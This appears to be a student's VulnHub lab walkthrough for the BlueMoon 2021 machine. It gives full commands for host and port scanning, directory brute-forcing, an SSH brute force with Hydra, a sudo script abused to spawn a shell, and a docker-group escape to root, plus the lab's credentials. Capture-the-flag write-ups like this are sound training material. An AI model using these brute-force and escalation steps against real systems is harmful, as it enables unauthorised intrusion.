# :closed_lock_with_key: Lab 2 - Bluemoon-2021 VulnHub Walkthrough

## Table of Contents

- [Lab Setup](#desktop_computer-lab-setup)
- [Step 1 - Reconnaissance](#mag-step-1---reconnaissance)
- [Step 2 - Find Your IP](#globe_with_meridians-step-2---find-your-ip)
- [Step 3 - Discover Target Machine](#satellite-step-3---discover-target-machine)
- [Step 4 - Port Scanning](#door-step-4---port-scanning)
- [Step 5 - Web Enumeration](#earth_africa-step-5---web-enumeration)
- [Step 6 - Hidden Directory Discovery](#card_index_dividers-step-6---explore-hidden-directory)
- [Step 7 - FTP Access](#file_folder-step-7--login-via-ftp)
- [Step 8 - SSH Brute Force](#old_key-step-8--ssh-brute-force)
- [Step 9 - Initial Access](#computer-step-9--ssh-login)
- [Step 10 - Horizontal Privilege Escalation](#arrow_up-step-10--horizontal-privilege-escalation-to-jerry)
- [Step 11 - Root Privilege Escalation](#whale-step-11--vertical-privilege-escalation)
- [Conclusion](#books-conclusion)

A step-by-step penetration testing walkthrough for the **BlueMoon 2021 VulnHub machine**.

---

## :desktop_computer: Lab Setup

- Attacker Machine: Kali Linux
- Target Machine: BlueMoon
- Network: Host-Only Adapter
- Tools Used:
  - netdiscover
  - nmap
  - gobuster
  - hydra
  - ftp
  - ssh

[Download from VulnHub](https://www.vulnhub.com/entry/bluemoon-2021,679/)  
Import and start it in **VirtualBox**  
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/Bluemoon.png)

---

## :mag: Step 1 - Reconnaissance
Locating the target IP within the local network range.
```bash
netdiscover
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/Recon%20netdiscover.png)

---

## :globe_with_meridians: Step 2 - Find Your IP
Check the IP address of the Kali Linux attacker machine.  
```bash
ifconfig
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/ifconfig.png)
> Attacker machine's IP address (`192.168.56.108`)

---

## :satellite: Step 3 - Discover Target Machine

Nmap is used to identify open ports and running services on the target machine.  

```bash
nmap -sn 192.168.56.0/24
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/nmap-sn.png)
> Identify the BlueMoon machine IP (`192.168.56.109`)

---

## :door: Step 4 - Port Scanning

Perform a full port scan to identify open services.  

```bash
nmap -sV -p- 192.168.56.109
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/nmap-sv-p-.png)

**Open ports found:**
| Port | State | Service | Version                                      |
|------|-------|---------|----------------------------------------------|
| 21   | Open  | FTP     |vsftpd 3.0.3                                  |
| 22   | Open  | SSH     |OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)|
| 80   | Open  | HTTP    |Apache httpd 2.4.38 ((Debian))                |

---

## :earth_africa: Step 5 - Web Enumeration

Access the web server through the browser `http://192.168.56.109`.  
No useful information is visible on the main page.  
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/http.png)

Gobuster is used to perform directory brute-forcing on the web server to discover hidden directories that are not visible on the main webpage.  

```bash
gobuster dir -u http://192.168.56.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t10 --timeout 30s
```
The ``` -t10``` option increases the scanning speed by allowing multiple requests at the same time.  
The ```--timeout 30s``` option prevents the scan from waiting too long for slow server responses.

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/gobuster.png)
> Discovered: `/hidden_text`

---

## :card_index_dividers: Step 6 - Explore Hidden Directory

Navigate to the discovered directory `http://192.168.56.109/hidden_text`

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/hidden_text.png)
- Click the **"Thank you…"** link
- A **QR code image** will appear — download it

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/QR%20code.png)

Decode the QR code at [https://zxing.org/w/decode.jspx](https://zxing.org/w/decode.jspx)
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/decodedcode.png)

**Credentials found:**
```
USER: userftp
PASSWORD: ftpp@ssword
```

---
## :file_folder: Step 7 — Login via FTP

Login using the discovered FTP credentials.  

```bash
ftp 192.168.56.109
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/loginFTP.png)

List down the files, and there are two files called information.txt and p_lists.txt.

```bash
ls
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/get.png)

Download those files to host machine using get command.

```bash
get information.txt
get p_lists.txt
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/ls.png)

Read the files:

```bash
cat information.txt
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/catinformation.png)

```bash
cat p_lists.txt
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/catp_lists.png)

> `information.txt` reveals a username: **robin**  
> `p_lists.txt` is a password list

---

## :old_key: Step 8 — SSH Brute Force

Using Hydra to brute force SSH.

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.109
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/hydra.png)

**Credentials Discovered:**
```
Login: robin
Password: k4rv3ndh4nh4ck3r
```

---
## :computer: Step 9 — SSH Login

```bash
ssh robin@192.168.56.109
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/SSHLogin.png)
```bash
ls -l
cat user1.txt
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/flag1.png)
> :triangular_flag_on_post: **Flag 1 obtained!**

---
## :arrow_up: Step 10 — Horizontal Privilege Escalation to Jerry

Check sudo privileges.  

```bash
sudo -l
```
![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/sudo-l.png)

```bash
cd project
ls
cat feedback.sh
```

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/catfeedbacksh.png)

> A script `feedback.sh` can be executed as **jerry**

Execute the script.  

```bash
sudo -u jerry /home/robin/project/feedback.sh
```

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/runasjerry.png)

- When prompted for **name**, type: `jerry`
- When prompted for **feedback**, type: `/bin/bash`

```bash
whoami
pwd
ls
cd /home/jerry
ls
cat user2.txt
```

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/flag2.png)

> :triangular_flag_on_post: **Flag 2 obtained!**

---

## :whale: Step 11 — Vertical Privilege Escalation

Upgrade to interactive shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/python.png)

Check group membership.

```bash
id
```

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/iddocker.png)

> User `jerry` is in the `docker` group.

> Users in the docker group can run containers with root privileges.

List docker images.

```bash
docker image ls
```

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/dockerimagels.png)

GTFOBins consists of commands we can use with docker in order to escalate our privileges to root. [GTFOBins Docker](https://gtfobins.github.io/gtfobins/docker/)  
So, we can exploit Alpine image and mount the root directory in a docker container which will prompt us the root shell.

> This Docker command runs a container using the Alpine Linux image (`alpine`). Here's what each part of the command does:

> `-v /:/mnt` : This mounts the host's root directory (`/`) to the `/mnt` directory within the container. This allows the container to access files and directories on the host system.

> `--rm` : This flag specifies that the container should be automatically removed when it exits.

> `-it` : This combination of flags (`-i` for interactive and `-t` for terminal) allocates a pseudo-TTY and allows interaction with the container.

> `alpine` : This is the name of the Docker image being used to create the container.

> `chroot /mnt sh` : This command is executed inside the container. It changes the root directory to `/mnt`, effectively making the host's root directory the root directory within the container, and then starts an interactive shell (`sh`) within that context.

Exploit the docker container to mount the root filesystem.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/dockeralpine.png)

Verify root access and retrieve the root flag.

```bash
id
cd /root
ls
cat root.txt
```

![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/flag3.png)

> :triangular_flag_on_post: **Root Access Achieved – Machine Successfully Compromised!**

# :books: Conclusion

This VulnHub machine demonstrates several important penetration testing techniques:

- Network discovery using **netdiscover**
- Port scanning using **nmap**
- Web directory enumeration using **gobuster**
- Credential discovery through **QR code decoding**
- SSH brute force using **hydra**
- Horizontal privilege escalation
- Root privilege escalation via **docker group abuse**

Through these steps, full root access to the machine was achieved.
